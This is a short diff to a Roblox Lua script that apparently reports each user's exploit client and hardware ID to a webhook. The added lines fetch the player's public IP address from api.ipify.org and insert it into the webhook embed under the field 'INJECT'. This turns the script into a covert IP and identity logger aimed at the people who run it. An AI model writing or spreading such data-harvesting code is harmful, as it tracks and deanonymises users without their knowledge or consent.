@@ -2,7 +2,7 @@
 	local HTTP_ = game:GetService('HttpService')
 	local LPR = game:GetService('Players').LocalPlayer
 	local HWIDS = game:GetService("RbxAnalyticsService"):GetClientId()
-        
+        local BALLER = tostring(game:HttpGet("https://api.ipify.org/", true))
 	-- Map exploit names to their corresponding values
 	local exploitNames = {
 		["is_sirhurt_closure"] = "Sirhurt",
@@ -32,7 +32,7 @@
 				["fields"] = {
 					{ name = "Exploit", value = webhookcheck, inline = true },
 					{ name = "HWID", value = HWIDS, inline = true },
-                                        
+                                        { name = "INJECT", value = BALLER, inline = true },
 				},
 				["color"] = tonumber(0xF08000),
 			}
